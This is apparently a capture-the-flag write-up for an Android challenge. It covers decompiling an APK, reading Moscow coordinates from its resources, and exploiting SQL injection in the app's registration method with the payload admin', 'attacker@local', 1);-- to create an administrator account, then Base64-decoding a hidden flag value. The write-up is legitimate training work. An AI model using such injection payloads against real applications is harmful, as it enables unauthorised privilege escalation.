# Latitude of Injection — Complete Write-up

## Challenge Information

- **Challenge:** Latitude of Injection
- **APK:** `loi_v1.apk`
- **Target:** `https://kicyber-ffe53a857dc6-latitude-of-injectio-0-0.chals.io/`
- **Category:** Android reverse engineering / SQL injection

## 1. APK Analysis

The APK package name is:

```text
com.ctf.loi
```

The application is named **Latitude of Injection**. Its manifest requests location and internet permissions:

```text
ACCESS_COARSE_LOCATION
ACCESS_FINE_LOCATION
INTERNET
```

The relevant application classes are:

```text
com.ctf.loi.MainActivity
com.ctf.loi.ScreensKt
com.ctf.loi.LocalDbHelper
com.ctf.loi.UserRow
```

## 2. Discovering the City

`MainActivity` reads three location values from Android resources:

```java
final double allowedLat = Double.parseDouble(getString(R.string.l1));
final double allowedLon = Double.parseDouble(getString(R.string.l2));
final double allowedRadius = Double.parseDouble(getString(R.string.al_r));
```

The resource values are:

```xml
<string name="l1">55.7558</string>
<string name="l2">37.6173</string>
<string name="al_r">300000.0</string>
```

These coordinates identify Moscow:

```text
Latitude:  55.7558
Longitude: 37.6173
Radius:    300000 meters
```

The image bundled in the APK also depicts Moscow, confirming the clue.

Therefore, the city value for the web server is:

```text
Moscow
```

## 3. Examining the Local Database

The app creates a SQLite database named:

```text
loi_local.db
```

The database schema is:

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    email TEXT,
    is_admin INTEGER DEFAULT 0
);
```

Normal users are inserted with `is_admin = 0`. The login process looks up a user by name and grants access to the Admin Panel if:

```text
is_admin = 1
```

## 4. Finding the SQL Injection

The vulnerable registration method constructs SQL by concatenating user input:

```java
String query =
    "INSERT INTO users (name, email, is_admin) VALUES ('"
    + name + "', '"
    + email + "', 0);";

database.execSQL(query);
```

The `name` field is injectable because it is not escaped or parameterized.

The payload used was:

```text
admin', 'attacker@local', 1);--
```

The resulting SQL becomes:

```sql
INSERT INTO users (name, email, is_admin)
VALUES ('admin', 'attacker@local', 1);--', 'email@example.com', 0);
```

The `--` comments out the rest of the original statement. This creates an administrator account:

```text
Name:  admin
Email: attacker@local
Role:  administrator
```

Logging in with the name `admin` opens the privileged Admin Panel.

## 5. Extracting the Privileged Information

The APK contains ten suspicious Base64-encoded resources:

```text
not_required1
not_required2
...
not_required10
```

The Admin Panel code specifically references:

```java
R.string.not_required7
```

The corresponding resource is:

```xml
<string name="not_required7">ckdjN340OXQ3V1dKfmhNZjc3</string>
```

Base64-decoding it produces:

```text
rGc7~49t7WWJ~hMf77
```

This is the privileged value required by the flag server.

## 6. Submitting the Solution

The live server has two fields:

```text
City
Privileged Info
```

The following values were submitted:

```text
City:            Moscow
Privileged Info: rGc7~49t7WWJ~hMf77
```


## 7. Challenges Encountered

### Temporary service outage

Initially, the endpoint returned:

```text
Couldn't find underlying service
```

Static APK analysis was completed first, and the endpoint was retried later when it became available.

### Noisy APK strings

The APK contains multiple DEX files and many Android/Jetpack framework classes. Searching raw strings produced mostly irrelevant results.

**Solution:** Decompile the APK and restrict analysis to the application package `com.ctf.loi`.

### Hidden city clue

The manifest exposed only location permissions, not the city name.

**Solution:** Inspect the resource values `l1` and `l2`, then identify the coordinates as Moscow. The bundled image provided additional confirmation.

### Decoy encoded resources

The ten `not_required` resources made it unclear which value mattered.

**Solution:** Trace the Admin Panel code and identify its direct reference to `not_required7`.

### Injection was in registration, not login

The login query uses a parameterized lookup and is not the injection point.

**Solution:** Trace the complete registration-to-login flow and inspect `LocalDbHelper.createUser()`, where unsafe SQL concatenation allows administrator creation.

## 8. Vulnerability Summary

The primary vulnerability is SQL injection caused by unsafe query construction:

```java
"... VALUES ('" + name + "', ...)"
```

This allows an attacker to modify the `is_admin` value and escalate to administrator privileges.

The challenge combines:

1. Android APK reverse engineering
2. Location clue extraction
3. SQL injection
4. Privilege escalation
5. Base64 decoding
6. Web flag submission

